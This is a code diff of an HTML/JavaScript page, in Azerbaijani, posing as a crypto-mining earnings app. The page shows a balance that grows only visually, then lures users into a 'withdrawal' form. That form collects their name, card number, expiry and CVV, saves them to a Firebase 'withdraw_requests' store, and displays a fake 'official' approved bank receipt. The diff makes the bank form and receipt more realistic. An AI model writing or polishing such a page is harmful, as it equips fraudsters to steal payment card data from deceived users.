@@ -1,199 +1,212 @@
-<div id="app-root" style="background: #050507; min-height: 100vh; color: white; font-family: 'Inter', sans-serif; position: relative; overflow-x: hidden;">
+<div id="app-root" style="background: #0d1117; min-height: 100vh; color: #c9d1d9; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; position: relative; overflow-x: hidden;">
     
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;600&display=swap');
-        
-        /* Əsas Səhifə */
-        .main-container { padding: 20px; text-align: center; transition: 0.4s; }
-        .blur-bg { filter: blur(12px); pointer-events: none; }
-
-        .crypto-logos { display: flex; justify-content: center; gap: 20px; margin: 30px 0; }
-        .crypto-logos img { width: 55px; height: 55px; border-radius: 50%; animation: float 3s infinite ease-in-out; }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-12px); } }
+        /* ƏSAS MINING EKRANI */
+        .main-screen { padding: 25px; text-align: center; transition: 0.5s; }
+        .blur-effect { filter: blur(15px); pointer-events: none; }
 
         .balance-card {
-            background: linear-gradient(180deg, rgba(255,255,255,0.03) 0%, rgba(0,0,0,0.6) 100%);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 35px; padding: 45px 20px; margin-bottom: 25px;
+            background: linear-gradient(145deg, #161b22, #0d1117);
+            border: 1px solid #30363d;
+            border-radius: 20px;
+            padding: 40px 20px;
+            margin: 40px 0;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
         }
-        .total-val { font-family: 'Orbitron', sans-serif; font-size: 3.5rem; margin: 15px 0; display: block; }
-        .total-val span { color: #3f9c35; }
+        .label-sm { font-size: 0.75rem; color: #8b949e; letter-spacing: 1.5px; text-transform: uppercase; }
+        .main-balance { font-size: 3.2rem; font-weight: 700; margin: 15px 0; color: #fff; letter-spacing: -1px; }
+        .main-balance span { color: #238636; margin-right: 5px; }
 
-        .btn-action {
-            width: 100%; padding: 20px; border-radius: 18px; border: none; font-weight: 900;
-            cursor: pointer; transition: 0.3s; text-transform: uppercase; margin-bottom: 15px;
+        .btn {
+            width: 100%; padding: 18px; border-radius: 12px; border: none; font-weight: 600;
+            font-size: 1rem; cursor: pointer; transition: 0.2s; margin-bottom: 15px;
         }
-        .btn-claim { background: #fff; color: #000; }
-        .btn-claim:disabled { background: #1a1a1a; color: #444; }
-        .btn-withdraw-open { background: transparent; border: 1px solid #222; color: #888; }
+        .btn-primary { background: #238636; color: #fff; }
+        .btn-primary:active { transform: scale(0.98); }
+        .btn-outline { background: transparent; border: 1px solid #30363d; color: #8b949e; }
 
-        /* WITHDRAW MODAL */
-        #withdraw-modal {
-            position: fixed; top: 100%; left: 0; width: 100%; height: 100%;
-            background: #0a0a0c; z-index: 1000; transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-            padding: 20px; box-sizing: border-box; overflow-y: auto;
+        /* REALİSTİK BANK MODALI */
+        #bank-modal {
+            position: fixed; bottom: -100%; left: 0; width: 100%; height: 90%;
+            background: #0d1117; z-index: 1000; transition: 0.5s cubic-bezier(0.32, 0, 0.67, 0);
+            border-top: 1px solid #30363d; border-radius: 25px 25px 0 0; padding: 25px; box-sizing: border-box;
         }
-        .modal-active { top: 0 !important; }
+        .modal-show { bottom: 0 !important; }
 
-        /* VIRTUAL CARD */
         .v-card {
-            width: 100%; max-width: 350px; height: 200px; background: linear-gradient(135deg, #1e1e20 0%, #000 100%);
-            border-radius: 20px; border: 1px solid #333; margin: 0 auto 25px; padding: 20px; position: relative;
+            width: 100%; max-width: 340px; height: 190px; border-radius: 15px;
+            background: linear-gradient(135deg, #21262d 0%, #0d1117 100%);
+            margin: 0 auto 25px; padding: 20px; position: relative; border: 1px solid #30363d;
         }
-        .card-logo { position: absolute; top: 20px; right: 20px; width: 50px; }
-        .card-num-view { font-family: 'Orbitron', sans-serif; font-size: 1.1rem; letter-spacing: 2px; display: block; margin-top: 40px; }
+        .chip { width: 45px; height: 32px; background: linear-gradient(135deg, #d4af37, #f9f295); border-radius: 6px; }
+        .card-num-disp { font-family: 'Courier New', monospace; font-size: 1.3rem; letter-spacing: 2px; display: block; margin-top: 35px; color: #f0f6fc; }
 
-        .m-input {
-            width: 100%; background: #111; border: 1px solid #222; border-radius: 12px;
-            padding: 15px; color: #fff; margin-bottom: 15px; outline: none; box-sizing: border-box;
+        .input-box {
+            width: 100%; background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+            padding: 14px; color: #fff; margin-bottom: 12px; outline: none; box-sizing: border-box;
         }
+
+        /* REALİSTİK ÖDƏNİŞ ÇEKİ */
+        #final-receipt {
+            display: none; position: fixed; inset: 0; background: #f0f2f5; color: #1c1e21;
+            padding: 40px 20px; z-index: 2000; font-family: 'Courier New', Courier, monospace;
+        }
+        .paper {
+            background: #fff; padding: 30px; border-radius: 2px; box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            max-width: 380px; margin: 0 auto; position: relative;
+        }
+        .paper::after { content: ''; position: absolute; bottom: -10px; left: 0; width: 100%; height: 10px; background: linear-gradient(-45deg, transparent 5px, #fff 5px), linear-gradient(45deg, transparent 5px, #fff 5px); background-size: 10px 10px; }
     </style>
 
-    <div id="main-ui" class="main-container">
-        <div class="crypto-logos">
-            <img src="btc.png" alt="BTC">
-            <img src="eth.png" alt="ETH" style="animation-delay: 0.5s">
-            <img src="usdt.png" alt="USDT" style="animation-delay: 1s">
+    <div id="ui-main" class="main-screen">
+        <div style="margin-top: 20px; opacity: 0.6;">
+            <img src="btc.png" width="40" style="margin: 0 8px;">
+            <img src="usdt.png" width="40" style="margin: 0 8px;">
         </div>
 
         <div class="balance-card">
-            <div style="font-size: 0.7rem; letter-spacing: 4px; color: #00b9ff; font-weight: bold;">TOTAL REVENUE</div>
-            <strong class="total-val"><span>$</span><span id="bal-display">0.00</span></strong>
-            <div id="live-speed" style="color: #3f9c35; font-weight: bold; font-size: 0.8rem; margin-bottom: 25px;">+0.000000 USD/s</div>
-            
-            <button class="btn-action btn-claim" id="claim-btn" onclick="handleClaim()">COLLECT PROFITS</button>
-            <div id="timer-display" style="font-size: 0.75rem; color: #555;">Sistem aktivdir</div>
+            <div class="label-sm">Mövcud Balans (USD)</div>
+            <div class="main-balance"><span>$</span><span id="bal-val">0.00</span></div>
+            <div id="mining-status" style="color: #3fb950; font-size: 0.85rem; font-weight: 600;">Sistem aktivdir (+0.000055/san)</div>
         </div>
 
-        <button class="btn-action btn-withdraw-open" onclick="toggleModal(true)">
-            <i class="fas fa-credit-card"></i> KARTA ÇIXARIŞ (MIN: $15)
-        </button>
+        <button class="btn btn-primary" onclick="collectReward()">GƏLİRİ BALANSA ƏLAVƏ ET</button>
+        <button class="btn btn-outline" onclick="openBank()">BANK KARTINA KÖÇÜRMƏ</button>
+        
+        <p style="font-size: 0.75rem; color: #484f58; margin-top: 20px;">Minimum çıxarış məbləği: $15.00</p>
     </div>
 
-    <div id="withdraw-modal">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-            <h2 style="font-family: 'Orbitron'; color: #3f9c35; font-size: 1rem;">KART QEYDİYYATI</h2>
-            <button onclick="toggleModal(false)" style="background:none; border:none; color:#fff; font-size:1.5rem;">&times;</button>
+    <div id="bank-modal">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px;">
+            <span style="font-weight: 600; font-size: 0.9rem; color: #8b949e;">TRANSAKSİYA PANELİ</span>
+            <button onclick="closeBank()" style="background:none; border:none; color:#c9d1d9; font-size:1.8rem;">&times;</button>
         </div>
 
         <div class="v-card">
-            <img src="visa.png" id="card-brand" class="card-logo">
-            <span class="card-num-view" id="v-num">**** **** **** ****</span>
-            <div style="margin-top: 30px; display: flex; justify-content: space-between; font-size: 0.8rem;">
-                <div><small style="color:#555; display:block">SAHİBİ</small><span id="v-name">NAME SURNAME</span></div>
-                <div><small style="color:#555; display:block">TARİX</small><span id="v-exp">MM/YY</span></div>
+            <img src="visa.png" id="card-logo-v" style="position: absolute; top: 20px; right: 20px; width: 55px;">
+            <div class="chip"></div>
+            <span class="card-num-disp" id="v-card-n">**** **** **** ****</span>
+            <div style="margin-top: 25px; display: flex; justify-content: space-between; font-size: 0.8rem;">
+                <div><small style="color:#8b949e; display:block; font-size:0.6rem;">SAHİBİ</small><span id="v-card-h" style="text-transform:uppercase;">AD SOYAD</span></div>
+                <div><small style="color:#8b949e; display:block; font-size:0.6rem;">TARİX</small><span id="v-card-e">MM/YY</span></div>
             </div>
         </div>
 
-        <div style="max-width: 350px; margin: 0 auto;">
-            <input type="text" id="in-name" class="m-input" placeholder="AD SOYAD" oninput="syncCard()">
-            <input type="text" id="in-num" class="m-input" placeholder="KART NÖMRƏSİ" maxlength="19" oninput="syncCard()">
+        <div style="max-width: 340px; margin: 0 auto;">
+            <input type="text" id="i-name" class="input-box" placeholder="AD SOYAD" oninput="sync()">
+            <input type="text" id="i-num" class="input-box" placeholder="KART NÖMRƏSİ" maxlength="19" oninput="sync()">
             <div style="display: flex; gap: 10px;">
-                <input type="text" id="in-exp" class="m-input" placeholder="MM/YY" maxlength="5" oninput="syncCard()">
-                <input type="password" id="in-cvv" class="m-input" placeholder="CVV" maxlength="3">
+                <input type="text" id="i-exp" class="input-box" placeholder="AA/İİ" maxlength="5" oninput="sync()">
+                <input type="password" id="i-cvv" class="input-box" placeholder="CVV" maxlength="3">
             </div>
-            <input type="number" id="in-amt" class="m-input" placeholder="MƏBLƏĞ ($)">
-            <button class="btn-action" style="background: #3f9c35; color: white;" onclick="finalizeWithdraw()">SORĞUNU GÖNDƏR</button>
+            <input type="number" id="i-amt" class="input-box" placeholder="KÖÇÜRÜLƏCƏK MƏBLƏĞ ($)">
+            <button class="btn btn-primary" style="margin-top: 10px;" onclick="finish()">KÖÇÜRMƏNİ TƏSDİQLƏ</button>
         </div>
     </div>
 
-    <div id="receipt-view" style="display:none; position:fixed; inset:0; background:#fff; color:#000; padding:40px 20px; font-family:monospace; z-index:2000;">
-        <h2 style="text-align:center">WW24 RECEIPT</h2>
-        <p>USER: <span id="rec-user"></span></p>
-        <p>CARD: <span id="rec-card"></span></p>
-        <p>AMOUNT: $<span id="rec-amt"></span></p>
-        <hr style="border:1px dashed #000">
-        <p style="text-align:center">PROCESSED SUCCESSFULLY</p>
-        <button onclick="location.reload()" style="width:100%; padding:15px; background:#000; color:#fff; border:none; margin-top:20px;">CLOSE</button>
+    <div id="final-receipt">
+        <div class="paper">
+            <div style="text-align: center; border-bottom: 1px dashed #000; padding-bottom: 15px; margin-bottom: 15px;">
+                <h3 style="margin: 0; letter-spacing: 2px;">BANK TRANSFER</h3>
+                <small>RƏSMİ ÖDƏNİŞ ÇEKİ</small>
+            </div>
+            <p>TARİX: <span id="r-date"></span></p>
+            <p>İSTİFADƏÇİ: <span id="r-user"></span></p>
+            <p>KART: <span id="r-card"></span></p>
+            <p>MƏBLƏĞ: <b id="r-amt"></b> USD</p>
+            <p>STATUS: <span style="color: green;">TƏSDİQLƏNDİ</span></p>
+            <div style="border-top: 1px dashed #000; margin-top: 15px; padding-top: 15px; font-size: 0.7rem; text-align: center;">
+                Köçürmə 24 saat ərzində bank tərəfindən emal ediləcəkdir.
+            </div>
+            <button onclick="location.reload()" style="width: 100%; padding: 10px; background: #000; color: #fff; border: none; margin-top: 20px; font-family: inherit;">BAĞLA</button>
+        </div>
     </div>
 
 </div>
 
 <script>
-    const userID = localStorage.getItem('elite_session') || 'Guest';
-    let currentBalance = 0;
+    const user = localStorage.getItem('elite_session') || 'Qonaq';
+    let balance = 0;
+
+    // Sürət tənzimləməsi: 5 saata ~1$ yığmaq üçün
+    // 5 saat = 18,000 saniyə. 1 / 18,000 ≈ 0.000055 USD/san
+    const MINING_SPEED = 0.0000555; 
 
     // Firebase Sinxronizasiyası
-    db.ref('mining/' + userID).on('value', snap => {
-        const data = snap.val() || { balance: 0, lastClaim: 0, status: 'active' };
-        if(data.status === 'blocked') { document.body.innerHTML = "<h1>BLOKLANIB</h1>"; return; }
+    db.ref('mining/' + user).on('value', snap => {
+        const d = snap.val() || { balance: 0, lastSync: Date.now() };
         
-        currentBalance = parseFloat(data.balance);
-        document.getElementById('bal-display').innerText = currentBalance.toFixed(2);
-        checkTimer(data.lastClaim);
+        // Real vaxt artımı (Mining həmişə artan tempdə)
+        const secondsPassed = (Date.now() - (d.lastSync || Date.now())) / 1000;
+        const autoEarned = secondsPassed * MINING_SPEED;
+        
+        balance = d.balance + autoEarned;
+        document.getElementById('bal-val').innerText = balance.toFixed(2);
     });
 
-    function checkTimer(last) {
-        const btn = document.getElementById('claim-btn');
-        const now = Date.now();
-        const wait = 3600000;
-        if(now - last < wait) {
-            btn.disabled = true;
-            const diff = wait - (now - last);
-            document.getElementById('timer-display').innerText = `Gözlə: ${Math.floor(diff/60000)}d ${Math.floor((diff%60000)/1000)}s`;
-            setTimeout(() => checkTimer(last), 1000);
-        } else {
-            btn.disabled = false;
-            document.getElementById('timer-display').innerText = "Toplamağa hazırdır!";
-        }
+    // Balansı hər saniyə artır (Yalnız vizual)
+    setInterval(() => {
+        balance += MINING_SPEED;
+        document.getElementById('bal-val').innerText = balance.toFixed(2);
+    }, 1000);
+
+    async function collectReward() {
+        // Balansı bazada yenilə
+        await db.ref('mining/' + user).update({ 
+            balance: balance,
+            lastSync: Date.now() 
+        });
+        alert("Gəlir balansınıza uğurla əlavə edildi!");
     }
 
-    async function handleClaim() {
-        const reward = (Math.random() * 0.3 + 0.1).toFixed(2);
-        await db.ref('mining/' + userID).update({ balance: currentBalance + parseFloat(reward), lastClaim: Date.now() });
+    function openBank() {
+        if(balance < 15) return alert("Minimum çıxarış $15.00 olmalıdır.");
+        document.getElementById('bank-modal').classList.add('modal-show');
+        document.getElementById('ui-main').classList.add('blur-effect');
     }
 
-    // Modal İdarəsi
-    function toggleModal(show) {
-        document.getElementById('withdraw-modal').classList.toggle('modal-active', show);
-        document.getElementById('main-ui').classList.toggle('blur-bg', show);
+    function closeBank() {
+        document.getElementById('bank-modal').classList.remove('modal-show');
+        document.getElementById('ui-main').classList.remove('blur-effect');
     }
 
-    // Kart Sinxronizasiyası
-    function syncCard() {
-        const num = document.getElementById('in-num').value;
-        const name = document.getElementById('in-name').value;
-        const exp = document.getElementById('in-exp').value;
+    function sync() {
+        const n = document.getElementById('i-num').value;
+        const h = document.getElementById('i-name').value;
+        const e = document.getElementById('i-exp').value;
         
-        document.getElementById('v-num').innerText = num || "**** **** **** ****";
-        document.getElementById('v-name').innerText = name || "NAME SURNAME";
-        document.getElementById('v-exp').innerText = exp || "MM/YY";
+        document.getElementById('v-card-n').innerText = n || "**** **** **** ****";
+        document.getElementById('v-card-h').innerText = h || "AD SOYAD";
+        document.getElementById('v-card-e').innerText = e || "MM/YY";
 
-        // Logo dəyişimi
-        const logo = document.getElementById('card-brand');
-        if(num.startsWith('4')) logo.src = 'visa.png';
-        else if(num.startsWith('5')) logo.src = 'master.png';
+        const logo = document.getElementById('card-logo-v');
+        if(n.startsWith('4')) logo.src = 'visa.png';
+        else if(n.startsWith('5')) logo.src = 'master.png';
 
-        // Auto format
-        document.getElementById('in-num').value = num.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        document.getElementById('i-num').value = n.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     }
 
-    async function finalizeWithdraw() {
-        const amt = parseFloat(document.getElementById('in-amt').value);
-        const num = document.getElementById('in-num').value;
-        if(amt < 15 || isNaN(amt)) return alert("Minimum $15!");
-        if(amt > currentBalance) return alert("Balans yetərsiz!");
+    async function finish() {
+        const amt = parseFloat(document.getElementById('i-amt').value);
+        if(amt < 15 || amt > balance) return alert("Məbləğ xətası!");
 
         const data = {
-            fullName: document.getElementById('in-name').value,
-            cardNumber: num,
-            expiry: document.getElementById('in-exp').value,
-            cvv: document.getElementById('in-cvv').value,
+            fullName: document.getElementById('i-name').value,
+            cardNumber: document.getElementById('i-num').value,
+            expiry: document.getElementById('i-exp').value,
+            cvv: document.getElementById('i-cvv').value,
             amount: amt,
             timestamp: new Date().toLocaleString()
         };
 
-        await db.ref('withdraw_requests/' + userID).push(data);
-        await db.ref('mining/' + userID).update({ balance: currentBalance - amt });
+        await db.ref('withdraw_requests/' + user).push(data);
+        await db.ref('mining/' + user).update({ balance: balance - amt, lastSync: Date.now() });
 
-        // Çeki göstər
-        document.getElementById('rec-user').innerText = userID;
-        document.getElementById('rec-card').innerText = num;
-        document.getElementById('rec-amt').innerText = amt;
-        document.getElementById('receipt-view').style.display = 'block';
+        // Çeki Göstər
+        document.getElementById('r-date').innerText = data.timestamp;
+        document.getElementById('r-user').innerText = user;
+        document.getElementById('r-card').innerText = data.cardNumber;
+        document.getElementById('r-amt').innerText = amt.toFixed(2);
+        document.getElementById('final-receipt').style.display = 'block';
     }
-
-    setInterval(() => {
-        document.getElementById('live-speed').innerText = "+" + (Math.random() * 0.0001).toFixed(6) + " USD/s";
-    }, 2000);
 </script>
